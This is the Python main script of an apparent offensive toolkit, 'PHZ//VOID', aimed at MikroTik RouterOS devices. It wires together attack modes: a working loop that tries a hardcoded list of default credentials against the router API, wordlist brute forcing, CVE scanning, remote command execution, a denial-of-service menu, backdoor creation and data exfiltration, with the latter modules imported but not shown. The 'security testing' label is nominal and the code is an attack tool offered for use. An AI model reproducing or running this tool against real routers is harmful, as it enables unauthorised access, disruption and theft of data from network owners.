#!/usr/bin/env python3
# PHZ//VOID - Main Entry Point (Full Version)
# MikroTik RouterOS Security Testing Framework

import sys
import os
import argparse
from datetime import datetime

# Add current directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.utils import ConfigLoader, HackerStyle, Logger
from lib.mikrotik_api import MikrotikAPI


def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description="PHZ//VOID - MikroTik RouterOS Security Framework",
        epilog="Example: python phz-void.py -t 192.168.1.1 --quick"
    )
    
    # Target options
    parser.add_argument("-t", "--target", help="Target IP address")
    parser.add_argument("--api-port", type=int, default=8728, help="API port (default: 8728)")
    parser.add_argument("--ssl", action="store_true", help="Use SSL/TLS")
    parser.add_argument("-U", "--username", default="admin", help="Username")
    parser.add_argument("-P", "--password", help="Password")
    
    # Attack modes
    parser.add_argument("--quick", action="store_true", help="Quick attack with default credentials")
    parser.add_argument("--bruteforce", action="store_true", help="Brute force attack")
    parser.add_argument("--scan-cve", action="store_true", help="Scan for CVEs")
    parser.add_argument("--exploit", help="Run specific CVE exploit")
    parser.add_argument("--exec", help="Execute command on router")
    parser.add_argument("--dos", action="store_true", help="Launch DoS attack menu")
    parser.add_argument("--backdoor", action="store_true", help="Create backdoor menu")
    parser.add_argument("--exfil", action="store_true", help="Extract data menu")
    parser.add_argument("--scan-network", action="store_true", help="Scan network for active IPs")
    parser.add_argument("--interactive", action="store_true", help="Interactive shell mode")
    
    # Wordlist options
    parser.add_argument("-u", "--users", help="Username wordlist file")
    parser.add_argument("-p", "--passwords", help="Password wordlist file")
    parser.add_argument("-c", "--combos", help="Combo wordlist file (user:pass)")
    
    # Attack options
    parser.add_argument("--threads", type=int, default=10, help="Number of threads")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between attempts")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode")
    
    # Output options
    parser.add_argument("-v", "--verbose", action="count", default=0, help="Verbose output")
    parser.add_argument("--no-banner", action="store_true", help="Disable banner")
    
    return parser.parse_args()


def quick_attack(target, api_port=8728, use_ssl=False):
    """Quick attack with default credentials"""
    HackerStyle.warning("Starting QUICK ATTACK mode...")
    
    default_creds = [
        ("admin", ""),
        ("admin", "admin"),
        ("admin", "123456"),
        ("admin", "password"),
        ("admin", "admin123"),
        ("admin", "mikrotik"),
        ("admin", "routeros"),
        ("admin", "MikroTik"),
        ("root", ""),
        ("root", "root"),
        ("user", "user"),
    ]
    
    for username, password in default_creds:
        HackerStyle.info(f"Trying {username}:{password}")
        
        api = MikrotikAPI(target, port=api_port, use_ssl=use_ssl)
        if api.connect():
            if api.login(username, password):
                HackerStyle.success(f"✅ FOUND! {username}:{password}")
                api.disconnect()
                return True
        api.disconnect()
    
    HackerStyle.error("❌ No credentials found!")
    return False


def main():
    """Main entry point"""
    
    # Parse arguments
    args = parse_arguments()
    
    # Show banner
    if not args.no_banner:
        HackerStyle.banner()
    
    # ==================== INTERACTIVE MODE ====================
    if args.interactive:
        interactive_menu()
        return
    
    # ==================== SCAN NETWORK MODE ====================
    if args.scan_network:
        from core.network_scanner import NetworkScanner
        scanner = NetworkScanner()
        print("\n   [1] Quick ARP scan (instant)")
        print("   [2] Full ping sweep (accurate, 30-60s)")
        print("   [3] Fast scan (ARP + Gateway)")
        subchoice = input("\n   [?] Choose: ")
        if subchoice == "1":
            hosts = scanner.scan("arp")
        elif subchoice == "2":
            hosts = scanner.ping_sweep()
        else:
            hosts = scanner.fast_scan()
        scanner.print_report(hosts)
        return
    
    # ==================== DOS MODE ====================
    if args.dos:
        from modules.dos import DoSAttackModule
        if not args.target:
            target = input(HackerStyle.CYAN + "[?] Target IP: " + HackerStyle.RESET)
        else:
            target = args.target
        dos = DoSAttackModule(target)
        dos.menu()
        return
    
    # ==================== OTHER MODES NEED TARGET ====================
    if not args.target:
        HackerStyle.error("Target IP required! Use -t <IP> or --interactive")
        print("\nExamples:")
        print("  python phz-void.py -t 192.168.1.1 --quick")
        print("  python phz-void.py -t 192.168.1.1 --dos")
        print("  python phz-void.py --scan-network")
        print("  python phz-void.py --interactive")
        sys.exit(1)
    
    # ==================== QUICK ATTACK ====================
    if args.quick:
        quick_attack(args.target, args.api_port, args.ssl)
        return
    
    # ==================== BRUTE FORCE MODE ====================
    if args.bruteforce:
        from modules.brute import BruteForceModule
        bf = BruteForceModule(args.target)
        bf.brute_force_with_wordlist(
            user_file=args.users,
            pass_file=args.passwords,
            combo_file=args.combos
        )
        return
    
    # ==================== SCAN CVE MODE ====================
    if args.scan_cve:
        if not args.password:
            HackerStyle.error("Password required! Use -P <password>")
            sys.exit(1)
        
        api = MikrotikAPI(args.target, port=args.api_port, use_ssl=args.ssl)
        if api.connect() and api.login(args.username, args.password):
            from modules.exploit import CVEScanner
            scanner = CVEScanner(args.target, api)
            results = scanner.scan_all()
            scanner.print_report(results)
            api.disconnect()
        else:
            HackerStyle.error("Failed to connect/login!")
        return
    
    # ==================== COMMAND EXECUTION ====================
    if args.exec:
        if not args.password:
            HackerStyle.error("Password required! Use -P <password>")
            sys.exit(1)
        
        api = MikrotikAPI(args.target, port=args.api_port, use_ssl=args.ssl)
        if api.connect() and api.login(args.username, args.password):
            from modules.exec_cmd import CommandExecutor
            executor = CommandExecutor(api)
            result = executor.execute(args.exec)
            if result['success']:
                print("\n" + HackerStyle.GREEN + "=== OUTPUT ===" + HackerStyle.RESET)
                for item in result['output']:
                    for k, v in item.items():
                        print(f"  {k}: {v}")
            else:
                HackerStyle.error(f"Command failed: {result.get('error', 'Unknown error')}")
            api.disconnect()
        else:
            HackerStyle.error("Failed to connect/login!")
        return
    
    # ==================== BACKDOOR MODE ====================
    if args.backdoor:
        if not args.password:
            HackerStyle.error("Password required! Use -P <password>")
            sys.exit(1)
        
        api = MikrotikAPI(args.target, port=args.api_port, use_ssl=args.ssl)
        if api.connect() and api.login(args.username, args.password):
            from modules.backdoor import BackdoorModule
            backdoor = BackdoorModule(api)
            backdoor.menu()
            api.disconnect()
        else:
            HackerStyle.error("Failed to connect/login!")
        return
    
    # ==================== EXFILTRATION MODE ====================
    if args.exfil:
        if not args.password:
            HackerStyle.error("Password required! Use -P <password>")
            sys.exit(1)
        
        api = MikrotikAPI(args.target, port=args.api_port, use_ssl=args.ssl)
        if api.connect() and api.login(args.username, args.password):
            from modules.exfil import ExfiltrationModule
            exfil = ExfiltrationModule(api)
            exfil.menu()
            api.disconnect()
        else:
            HackerStyle.error("Failed to connect/login!")
        return
    
    # ==================== DEFAULT ====================
    HackerStyle.warning("No action selected. Use --help for options")
    print("\nAvailable modes:")
    print("  --quick            Quick attack with default credentials")
    print("  --dos              DoS attack menu")
    print("  --scan-network     Scan for active IPs in network")
    print("  --bruteforce       Brute force attack")
    print("  --scan-cve         Scan for CVEs")
    print("  --exec <cmd>       Execute command")
    print("  --backdoor         Create backdoor")
    print("  --exfil            Extract data")
    print("  --interactive      Interactive mode")


def interactive_menu():
    """Interactive menu without command line arguments"""
    while True:
        print("\n" + "="*60)
        print(f"  {HackerStyle.RED}PHZ//VOID - Interactive Mode{HackerStyle.RESET}")
        print("="*60)
        print("  1. Quick Attack (Default Credentials)")
        print("  2. DoS Attack Menu")
        print("  3. Scan Network (Find Active IPs)")
        print("  4. Brute Force Attack")
        print("  5. CVE Scanner")
        print("  6. Command Execution")
        print("  7. Backdoor Menu")
        print("  8. Data Exfiltration")
        print("  9. Exit")
        print("="*60)
        
        choice = input(HackerStyle.CYAN + "\n[?] Select option: " + HackerStyle.RESET)
        
        if choice == "1":
            target = input(HackerStyle.CYAN + "[?] Target IP: " + HackerStyle.RESET)
            port = int(input("[?] API port (default 8728): ") or 8728)
            quick_attack(target, port)
        
        elif choice == "2":
            target = input(HackerStyle.CYAN + "[?] Target IP: " + HackerStyle.RESET)
            from modules.dos import DoSAttackModule
            dos = DoSAttackModule(target)
            dos.menu()
        
        elif choice == "3":
            from core.network_scanner import NetworkScanner
            scanner = NetworkScanner()
            print("\n   [1] Quick ARP scan (instant)")
            print("   [2] Full ping sweep (accurate, 30-60s)")
            print("   [3] Fast scan (ARP + Gateway)")
            subchoice = input("\n   [?] Choose: ")
            if subchoice == "1":
                hosts = scanner.scan("arp")
            elif subchoice == "2":
                hosts = scanner.ping_sweep()
            else:
                hosts = scanner.fast_scan()
            scanner.print_report(hosts)
        
        elif choice == "4":
            target = input(HackerStyle.CYAN + "[?] Target IP: " + HackerStyle.RESET)
            port = int(input("[?] API port (default 8728): ") or 8728)
            username = input("[?] Username (default admin): ") or "admin"
            password = input("[?] Password: ")
            api = MikrotikAPI(target, port=port)
            if api.connect() and api.login(username, password):
                from modules.brute import BruteForceModule
                bf = BruteForceModule(target)
                user_file = input("[?] Username file (Enter for default): ") or None
                pass_file = input("[?] Password file (Enter for default): ") or None
                bf.brute_force_with_wordlist(user_file, pass_file)
                api.disconnect()
            else:
                HackerStyle.error("Failed to connect/login!")
        
        elif choice == "5":
            target = input(HackerStyle.CYAN + "[?] Target IP: " + HackerStyle.RESET)
            port = int(input("[?] API port (default 8728): ") or 8728)
            username = input("[?] Username (default admin): ") or "admin"
            password = input("[?] Password: ")
            api = MikrotikAPI(target, port=port)
            if api.connect() and api.login(username, password):
                from modules.exploit import CVEScanner
                scanner = CVEScanner(target, api)
                results = scanner.scan_all()
                scanner.print_report(results)
                api.disconnect()
            else:
                HackerStyle.error("Failed to connect/login!")
        
        elif choice == "6":
            target = input(HackerStyle.CYAN + "[?] Target IP: " + HackerStyle.RESET)
            port = int(input("[?] API port (default 8728): ") or 8728)
            username = input("[?] Username (default admin): ") or "admin"
            password = input("[?] Password: ")
            api = MikrotikAPI(target, port=port)
            if api.connect() and api.login(username, password):
                from modules.exec_cmd import CommandExecutor
                executor = CommandExecutor(api)
                executor.interactive_shell()
                api.disconnect()
            else:
                HackerStyle.error("Failed to connect/login!")
        
        elif choice == "7":
            target = input(HackerStyle.CYAN + "[?] Target IP: " + HackerStyle.RESET)
            port = int(input("[?] API port (default 8728): ") or 8728)
            username = input("[?] Username (default admin): ") or "admin"
            password = input("[?] Password: ")
            api = MikrotikAPI(target, port=port)
            if api.connect() and api.login(username, password):
                from modules.backdoor import BackdoorModule
                backdoor = BackdoorModule(api)
                backdoor.menu()
                api.disconnect()
            else:
                HackerStyle.error("Failed to connect/login!")
        
        elif choice == "8":
            target = input(HackerStyle.CYAN + "[?] Target IP: " + HackerStyle.RESET)
            port = int(input("[?] API port (default 8728): ") or 8728)
            username = input("[?] Username (default admin): ") or "admin"
            password = input("[?] Password: ")
            api = MikrotikAPI(target, port=port)
            if api.connect() and api.login(username, password):
                from modules.exfil import ExfiltrationModule
                exfil = ExfiltrationModule(api)
                exfil.menu()
                api.disconnect()
            else:
                HackerStyle.error("Failed to connect/login!")
        
        elif choice == "9":
            HackerStyle.info("Exiting...")
            break
        
        else:
            HackerStyle.error("Invalid choice!")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        HackerStyle.warning("\n[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        HackerStyle.error(f"Unexpected error: {e}")
        sys.exit(1)